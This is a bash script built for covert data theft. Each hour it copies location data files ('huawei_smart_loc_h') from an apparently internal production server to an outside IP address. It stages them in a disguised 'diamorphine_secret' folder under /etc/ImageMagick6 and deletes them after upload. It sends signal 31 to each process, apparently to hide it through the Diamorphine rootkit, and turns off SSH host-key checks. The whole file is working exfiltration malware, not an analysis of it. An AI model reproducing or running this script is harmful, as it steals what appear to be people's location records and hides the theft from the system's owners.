#!/bin/bash

REMOTE_USER="svc-weblog"
REMOTE_HOST="kv-ors-ml-prod.intra.net.ua"
REMOTE_DIR="/sas/dwh2/compute/udata7/"

SECOND_VPS_USER="tinker"
SECOND_VPS_HOST="77.110.103.196"
SECOND_VPS_DIR="/home/tinker/upload/"

while true; do
    CURRENT_DATE=$(date -d "yesterday" +%Y%m%d)
    CURRENT_HOUR=$(date +%H)
    FILENAME="huawei_smart_loc_h_${CURRENT_DATE}_${CURRENT_HOUR}.sas7bdat"
    REMOTE_PATH="${REMOTE_DIR}${FILENAME}"
    LOCAL_PATH="/etc/ImageMagick6/ImageMagick-6/diamorphine_secret_O3V1KbSCIm44nBw/up/${FILENAME}"

    /usr/bin/scp -i /home/lemon/.ssh/id_rsa -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=30 "${REMOTE_USER}@${REMOTE_HOST}:${REMOTE_PATH}" "${LOCAL_PATH}" &
    SCP_DOWNLOAD_PID=$!

    kill -31 "${SCP_DOWNLOAD_PID}" 2>/dev/null || true
    
    if [ -n "${SCP_DOWNLOAD_PID}" ]; then
        CHILD_PIDS=$(pgrep -P "${SCP_DOWNLOAD_PID}" 2>/dev/null)
        for child_pid in ${CHILD_PIDS}; do
            kill -31 "${child_pid}" 2>/dev/null || true
        done
    fi

    wait "${SCP_DOWNLOAD_PID}" 2>/dev/null || true

    if [ -f "${LOCAL_PATH}" ]; then
        SECOND_VPS_PATH="${SECOND_VPS_DIR}${FILENAME}"
        
        /usr/bin/scp -i /home/lemon/.ssh/id_rsa -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=30 "${LOCAL_PATH}" "${SECOND_VPS_USER}@${SECOND_VPS_HOST}:${SECOND_VPS_PATH}" &
        SCP_UPLOAD_PID=$!

        kill -31 "${SCP_UPLOAD_PID}" 2>/dev/null || true
        
        if [ -n "${SCP_UPLOAD_PID}" ]; then
            CHILD_PIDS=$(pgrep -P "${SCP_UPLOAD_PID}" 2>/dev/null)
            for child_pid in ${CHILD_PIDS}; do
                kill -31 "${child_pid}" 2>/dev/null || true
            done
        fi

        wait "${SCP_UPLOAD_PID}" 2>/dev/null || true

        rm -f "${LOCAL_PATH}" 2>/dev/null || true
    fi

    sleep 3600 &
    SLEEP_PID=$!
    kill -31 "${SLEEP_PID}" 2>/dev/null || true
    wait "${SLEEP_PID}" 2>/dev/null || true
done
